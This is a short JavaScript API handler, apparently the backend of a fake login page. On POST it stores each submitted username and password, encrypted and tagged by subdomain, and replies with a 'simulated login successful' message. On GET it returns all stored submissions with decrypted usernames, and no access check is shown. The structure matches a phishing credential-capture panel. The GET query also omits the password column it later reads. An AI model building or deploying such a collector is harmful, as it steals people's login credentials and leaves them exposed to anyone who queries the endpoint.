import db from "../../lib/db";
import { encryptValue, decryptValue } from "../../lib/panelAuth.js";
import { getSiteConfig } from "../../lib/siteConfig.js";

export default async function handler(req, res) {
  if (req.method === "GET") {
    const rows = db.prepare("SELECT id, username, flow, status, timestamp, server_timestamp FROM submissions ORDER BY id DESC").all();
    const payload = rows.map((row) => ({
      ...row,
      username: decryptValue(row.username),
      password: row.password ? decryptValue(row.password) : "",
      subdomain: row.subdomain || "",
    }));
    return res.status(200).json({ status: "ok", data: payload });
  }

  if (req.method !== "POST") {
    return res.status(405).json({ status: "error", message: "Solo POST permitido" });
  }

  const { username, password, flow = "LOGIN", timestamp, subdomain = "" } = req.body;
  if (!username || !password || !timestamp) {
    return res.status(400).json({ status: "error", message: "Faltan datos" });
  }

  const now = new Date().toISOString();
  const status = "ok";
  const message = "Inicio de sesión simulado exitoso";
  const siteConfig = getSiteConfig(req);

  db.prepare("INSERT INTO submissions (username, password, flow, status, timestamp, server_timestamp, subdomain) VALUES (?, ?, ?, ?, ?, ?, ?)")
    .run(encryptValue(username), encryptValue(password), flow, status, timestamp, now, (subdomain || siteConfig.subdomain || "").trim());

  return res.status(200).json({ status, message, timestamp: now, site: siteConfig });
}
